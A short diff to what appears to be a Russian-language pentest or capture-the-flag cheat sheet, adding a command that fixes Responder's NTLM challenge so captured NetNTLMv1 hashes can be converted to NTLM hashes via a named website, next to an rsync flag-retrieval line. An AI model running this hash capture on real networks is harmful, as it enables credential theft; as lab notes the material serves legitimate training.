@@ -1894,6 +1894,7 @@ rsync 10.129.228.37::public/flag.txt flag.txt
 
 # Поймать хешь netntlmv1
 
+		sudo sed -i 's/ Challenge = Random/ Challenge = 1122334455667788/g' /usr/share/responder/Responder.conf
 		sudo responder -I eth0 --lm --disable-ess -v
 		https://ntlmv1.com/login.php (сайт который переводит netntlmv1 в NTLM hash)
 		
